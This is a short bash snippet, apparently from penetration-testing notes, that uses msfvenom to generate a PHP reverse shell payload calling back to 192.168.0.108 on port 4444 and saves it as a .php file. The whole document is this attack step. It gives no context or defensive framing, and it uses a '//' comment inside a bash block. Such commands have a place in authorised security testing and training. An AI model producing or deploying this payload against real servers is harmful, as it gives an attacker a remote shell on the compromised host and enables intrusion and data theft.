

```bash

// Generate a PHP reverse shell payload using msfvenom

msfvenom -p php/reverse_php LHOST=192.168.0.108 LPORT=4444 -f raw > msfvenom_php_shell.php


```